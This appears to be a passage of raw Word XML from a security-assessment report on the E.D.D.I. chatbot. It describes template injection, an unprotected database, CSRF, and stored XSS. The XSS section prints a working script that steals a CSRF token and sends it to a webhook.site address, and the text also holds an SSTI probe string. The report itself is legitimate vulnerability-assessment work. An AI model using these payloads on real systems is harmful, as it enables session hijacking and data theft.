        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>isDefault</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">=null}]}, last={}, past=[]}, userInfo={userId=anonymous-609575300e4542a39da0d8af1eeb6b6d}}[StandardTextInliner](This is an SSTI: “[[${#ctx}]]” !!!!!!!!)" </w:t>
      </w:r>
      <w:r w:rsidRPr="005160E2">
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>!!!!!!!!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B177C29" w14:textId="5CAA051A" w:rsidR="0081574A" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">In practice, the output exposes a structured object that includes all the </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">internal variables </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>used by the engine to generate the response: from the conversation status (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>memory.current</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.output</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) to user information (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>userInfo.userId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), to possible predefined quick responses. This demonstrates how a simple payload can become an “oracle” capable of </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">revealing sensitive data </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">within the application, and if the attacker were very determined and experienced, they could manage to </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>execute Java code</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39BE02A6" w14:textId="77777777" w:rsidR="00F8736B" w:rsidRDefault="001A39A9" w:rsidP="0081574A">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="46" w:name="_tt2hqgqi9lya" w:colFirst="0" w:colLast="0"/>
      <w:bookmarkEnd w:id="46"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="46099504" wp14:editId="07777777">
            <wp:extent cx="4919663" cy="2092082"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2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8"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4919663" cy="2092082"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C01275C" w14:textId="5E8A7FB3" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00F8736B" w:rsidP="0081574A">
      <w:pPr>
        <w:pStyle w:val="Titolo4"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="47" w:name="_Ref199858483"/>
      <w:r w:rsidRPr="00F8736B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00F8736B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
      <w:r w:rsidRPr="00F8736B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Part of interface in which there is the SSTI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFB9E20" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000080"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D173549" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00871FA9">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="48" w:name="_Ref199858638"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:color w:val="000080"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="6AF69E89" wp14:editId="07777777">
            <wp:extent cx="2182650" cy="2372012"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="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9"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2182650" cy="2372012"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BBA9DC" w14:textId="4D686632" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00871FA9" w:rsidP="00871FA9">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Ref199858677"/>
      <w:r w:rsidRPr="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00871FA9">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="48"/>
      <w:bookmarkEnd w:id="49"/>
      <w:r w:rsidR="001A39A9" w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: Part of interface in which there is the output of the SSTI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E871BC" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="226874B2" w14:textId="67351B09" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="50" w:name="_Toc200039282"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>No password for database was set</w:t>
      </w:r>
      <w:bookmarkEnd w:id="50"/>
    </w:p>
    <w:p w14:paraId="32FC8D1A" w14:textId="7BE4BFB2" w:rsidR="0080595D" w:rsidRPr="0080595D" w:rsidRDefault="0080595D" w:rsidP="0080595D">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0080595D">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>When development first began, the app's database wasn't password-protected in any way. However, this seemingly minor detail could have had extremely disastrous consequences, particularly if the app was being used in a business environment or hosted on the internet. In those situations, not requiring authentication for the database essentially offers unlimited access to anyone who knows about it. A simple automated sweep would be enough to gain access to the database and take full control: reading, updating or deleting data, creating fake users, adding malicious content, or even using it to break into other services.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBDE1BC" w14:textId="77777777" w:rsidR="0080595D" w:rsidRPr="0080595D" w:rsidRDefault="0080595D" w:rsidP="0080595D">
      <w:pPr>
        <w:pStyle w:val="NormaleWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0080595D">
        <w:rPr>
          <w:rFonts w:ascii="Lucida Sans" w:hAnsi="Lucida Sans"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Therefore, this was a serious vulnerability that could have led to privacy intrusions, data loss and compromise of the entire application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144A5D23" w14:textId="2F55D817" w:rsidR="00FF22F3" w:rsidRPr="00086144" w:rsidRDefault="00FF22F3" w:rsidP="00D30E89">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002039E1">
        <w:rPr>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7807FEFD" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="51" w:name="_Toc200039283"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="51"/>
    </w:p>
    <w:p w14:paraId="6A80E769" w14:textId="77777777" w:rsidR="008A62CD" w:rsidRPr="008A62CD" w:rsidRDefault="008A62CD" w:rsidP="008A62CD">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:before="360" w:after="120"/>
        <w:contextualSpacing w:val="0"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rStyle w:val="Titolo3Carattere"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:vanish/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="52" w:name="_Toc200039284"/>
      <w:bookmarkEnd w:id="52"/>
    </w:p>
    <w:p w14:paraId="0BEBCB99" w14:textId="5F44B92D" w:rsidR="00910649" w:rsidRPr="00034671" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="53" w:name="_Toc200039285"/>
      <w:r w:rsidRPr="00034671">
        <w:rPr>
          <w:rStyle w:val="Titolo3Carattere"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
      </w:r>
      <w:bookmarkEnd w:id="53"/>
    </w:p>
    <w:p w14:paraId="3A6262DB" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">No exploitation is possible because it isn’t a vulnerability issue. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBF94D4" w14:textId="39DE7DC7" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="54" w:name="_Toc200039286"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Request Forgery</w:t>
      </w:r>
      <w:bookmarkEnd w:id="54"/>
    </w:p>
    <w:p w14:paraId="6A2A984A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Before the E.D.D.I. system introduced protection against cross-site request forgery (CSRF) attacks via tokens, the application was susceptible to a potentially catastrophic threat. An attacker could make an authenticated user perform sensitive actions involuntarily by merely making them visit a malicious webpage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF41D7F" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>This attack exploited the fact that, when making a request to a domain, the browser automatically passes session cookies associated with that domain, even if the user has not directly interacted with the application. If the user was logged into E.D.D.I. and opened a webpage containing malicious code, such as a hidden HTML form or JavaScript script, the browser would send a request to the E.D.D.I. server with the session cookies included. This would make it appear as though the request was coming from the user himself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F634DE" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>For example, an off-site page could contain a form that makes a request to an E.D.D.I. endpoint to perform a sensitive action, such as deploying a new template or adjusting settings, without the user's awareness. If the server did not verify whether the request was valid (i.e. whether a CSRF token had been used), it would carry out the action anyway.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC7C4DA" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The problem is exacerbated in the absence of a login page. In this case, since there is no authentication, no CSRF token is generated. Therefore, anyone can directly make requests to application endpoints without authentication. This opens the door to even more dangerous scenarios: for example, an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthorised</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> individual could release an untested model containing known bugs or insecure code, which could put the entire system at risk.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC4CC7C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>In short, without token-based protection against CSRF and correct authentication, any outside party can mimic legitimate user interactions with the system. This leaves the application vulnerable to attack and exposes data and potentially sensitive code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40496248" w14:textId="77777777" w:rsidR="001237B1" w:rsidRDefault="001237B1" w:rsidP="001237B1">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="55" w:name="_Toc200039287"/>
      <w:r>
        <w:t>Cross-Site Scripting</w:t>
      </w:r>
      <w:bookmarkEnd w:id="55"/>
    </w:p>
    <w:p w14:paraId="0A636763" w14:textId="525B93A2" w:rsidR="00743CE2" w:rsidRDefault="001F114B" w:rsidP="001F114B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">This vulnerability allows an attacker to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">insert a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> script in the page</w:t>
      </w:r>
      <w:r w:rsidR="00046A20">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of reviews</w:t>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref200038927 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="009A055A">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00046A20">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> so that </w:t>
      </w:r>
      <w:r w:rsidR="00743CE2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">every user that will visit that page will load the malicious script that perform malicious action. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD1EB45" w14:textId="4CD55463" w:rsidR="00743CE2" w:rsidRDefault="00743CE2" w:rsidP="001F114B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Possible payload to </w:t>
      </w:r>
      <w:r w:rsidR="00C85E1C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>stole valid CSRF token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28494E9F" w14:textId="77777777" w:rsidR="001F114B" w:rsidRPr="005432B6" w:rsidRDefault="001F114B" w:rsidP="001F114B">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;script&gt;fetch('http://localhost:7070/auth/csrf-token').then(r=&gt;r.json()</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).then</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(d=&gt;fetch('https://webhook.site/e7e6a5e3-bc27-464f-910c-51d12de03d3c?csrf='+d.csrfToken))&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE1F38D" w14:textId="05E17A50" w:rsidR="001237B1" w:rsidRDefault="00C85E1C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The first fetch to http://localhost:7070/auth/csrf-token fetches a new CSRF token for the user’s session, and then the second fetch sends this new token immediately to a website in the hand of the attacker. As a result, the attacker can get a unique token identifying the victim (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199858881 \h </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="003A2011">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), to conduct perhaps a “play on his behalf”. Since it is injected directly into the answers from the bot and executed in the context of the user’s security, it is an example of XSS in which unaware customers are induced to perform unauthorized operations while being convinced to interact with an honest interface</w:t>
      </w:r>
      <w:r w:rsidR="009C680D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3835AB69" w14:textId="77777777" w:rsidR="002D24E4" w:rsidRDefault="009C680D" w:rsidP="002D24E4">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="009C680D">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47BEE7B3" wp14:editId="2EFEA917">
            <wp:extent cx="4204730" cy="3412123"/>
            <wp:effectExtent l="0" t="0" r="5715" b="0"/>
            <wp:docPr id="56"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208296" cy="3415017"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFD9FB3" w14:textId="61F7325B" w:rsidR="002D24E4" w:rsidRDefault="002D24E4" w:rsidP="002D24E4">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="_Ref200038927"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="56"/>
      <w:r>
        <w:t>: XSS attack in review form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58212CAC" w14:textId="6A5EAB0F" w:rsidR="009C680D" w:rsidRPr="005432B6" w:rsidRDefault="009C680D" w:rsidP="002D24E4">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32A6E291" w14:textId="19F541E0" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_Toc200039288"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Scripting: DOM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
    </w:p>
    <w:p w14:paraId="4671A94C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">No exploitation is possible because it isn’t a vulnerability issue. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2627F2" w14:textId="77777777" w:rsidR="001237B1" w:rsidRPr="005432B6" w:rsidRDefault="001237B1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F3543DD" w14:textId="69CE6F0B" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="58" w:name="_Toc200039289"/>
